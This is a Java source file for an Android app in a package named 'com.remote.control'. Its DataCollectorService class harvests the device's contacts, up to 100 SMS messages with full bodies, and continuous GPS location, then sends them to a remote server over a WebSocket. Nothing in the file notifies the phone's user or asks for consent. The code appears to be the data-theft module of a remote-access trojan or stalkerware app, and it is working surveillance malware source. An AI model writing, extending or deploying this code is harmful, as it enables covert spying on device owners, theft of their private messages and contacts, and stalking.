package com.remote.control;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.util.Log;

import androidx.core.content.ContextCompat;

import org.json.JSONArray;
import org.json.JSONObject;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.WebSocket;

public class DataCollectorService {

    private static final String TAG = "DataCollector";

    private final Context context;
    private LocationManager locationManager;
    private LocationListener locationListener;
    private Location lastKnownLocation;

    public DataCollectorService(Context context) {
        this.context = context;
    }

    // ===== CONTACTS =====
    public JSONArray getContacts() {
        JSONArray contacts = new JSONArray();
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS)
                != PackageManager.PERMISSION_GRANTED) {
            Log.w(TAG, "READ_CONTACTS permission not granted");
            return contacts;
        }

        ContentResolver resolver = context.getContentResolver();
        Cursor cursor = resolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            new String[]{
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER,
                ContactsContract.CommonDataKinds.Phone.TYPE
            },
            null, null,
            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
        );

        if (cursor != null) {
            try {
                while (cursor.moveToNext()) {
                    JSONObject contact = new JSONObject();
                    contact.put("name", cursor.getString(0));
                    contact.put("phone", cursor.getString(1));
                    contact.put("type", cursor.getInt(2));
                    contacts.put(contact);
                }
            } catch (Exception e) {
                Log.e(TAG, "Error reading contacts", e);
            } finally {
                cursor.close();
            }
        }

        Log.d(TAG, "Collected " + contacts.length() + " contacts");
        return contacts;
    }

    // ===== SMS =====
    public JSONArray getSms(int limit) {
        JSONArray smsList = new JSONArray();
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_SMS)
                != PackageManager.PERMISSION_GRANTED) {
            Log.w(TAG, "READ_SMS permission not granted");
            return smsList;
        }

        ContentResolver resolver = context.getContentResolver();
        Cursor cursor = resolver.query(
            Telephony.Sms.CONTENT_URI,
            new String[]{
                Telephony.Sms.ADDRESS,
                Telephony.Sms.BODY,
                Telephony.Sms.DATE,
                Telephony.Sms.TYPE,
                Telephony.Sms.READ
            },
            null, null,
            Telephony.Sms.DATE + " DESC"
        );

        if (cursor != null) {
            try {
                int count = 0;
                while (cursor.moveToNext() && count < limit) {
                    JSONObject sms = new JSONObject();
                    sms.put("address", cursor.getString(0));
                    sms.put("body", cursor.getString(1));
                    sms.put("date", cursor.getLong(2));
                    sms.put("type", cursor.getInt(3)); // 1=inbox, 2=sent
                    sms.put("read", cursor.getInt(4) == 1);
                    smsList.put(sms);
                    count++;
                }
            } catch (Exception e) {
                Log.e(TAG, "Error reading SMS", e);
            } finally {
                cursor.close();
            }
        }

        Log.d(TAG, "Collected " + smsList.length() + " SMS");
        return smsList;
    }

    // ===== LOCATION =====
    public void startLocationTracking() {
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION)
                != PackageManager.PERMISSION_GRANTED) {
            Log.w(TAG, "ACCESS_FINE_LOCATION permission not granted");
            return;
        }

        locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);

        locationListener = new LocationListener() {
            @Override
            public void onLocationChanged(Location location) {
                lastKnownLocation = location;
                Log.d(TAG, "Location updated: " + location.getLatitude() + ", " + location.getLongitude());
            }

            @Override
            public void onStatusChanged(String provider, int status, Bundle extras) {}

            @Override
            public void onProviderEnabled(String provider) {}

            @Override
            public void onProviderDisabled(String provider) {}
        };

        try {
            // Try GPS first, then network
            if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                locationManager.requestLocationUpdates(
                    LocationManager.GPS_PROVIDER, 30000, 10, locationListener, Looper.getMainLooper());
            }
            if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                locationManager.requestLocationUpdates(
                    LocationManager.NETWORK_PROVIDER, 30000, 10, locationListener, Looper.getMainLooper());
            }

            // Get last known location immediately
            lastKnownLocation = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (lastKnownLocation == null) {
                lastKnownLocation = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            }
        } catch (SecurityException e) {
            Log.e(TAG, "Location permission error", e);
        }
    }

    public void stopLocationTracking() {
        if (locationManager != null && locationListener != null) {
            locationManager.removeUpdates(locationListener);
        }
    }

    public JSONObject getLocation() {
        JSONObject loc = new JSONObject();
        try {
            if (lastKnownLocation != null) {
                loc.put("latitude", lastKnownLocation.getLatitude());
                loc.put("longitude", lastKnownLocation.getLongitude());
                loc.put("accuracy", lastKnownLocation.getAccuracy());
                loc.put("altitude", lastKnownLocation.getAltitude());
                loc.put("speed", lastKnownLocation.getSpeed());
                loc.put("timestamp", lastKnownLocation.getTime());
                loc.put("provider", lastKnownLocation.getProvider());
            } else {
                loc.put("error", "No location available");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error building location JSON", e);
        }
        return loc;
    }

    // ===== SEND DATA TO SERVER =====
    public void sendDataToServer(WebSocket webSocket, String dataType) {
        if (webSocket == null) return;

        try {
            JSONObject msg = new JSONObject();
            msg.put("type", "data-report");
            msg.put("dataType", dataType);

            switch (dataType) {
                case "contacts":
                    msg.put("data", getContacts());
                    break;
                case "sms":
                    msg.put("data", getSms(100));
                    break;
                case "location":
                    msg.put("data", getLocation());
                    break;
                case "all":
                    JSONObject allData = new JSONObject();
                    allData.put("contacts", getContacts());
                    allData.put("sms", getSms(50));
                    allData.put("location", getLocation());
                    msg.put("data", allData);
                    break;
            }

            webSocket.send(msg.toString());
            Log.d(TAG, "Data sent: " + dataType);
        } catch (Exception e) {
            Log.e(TAG, "Error sending data", e);
        }
    }
}
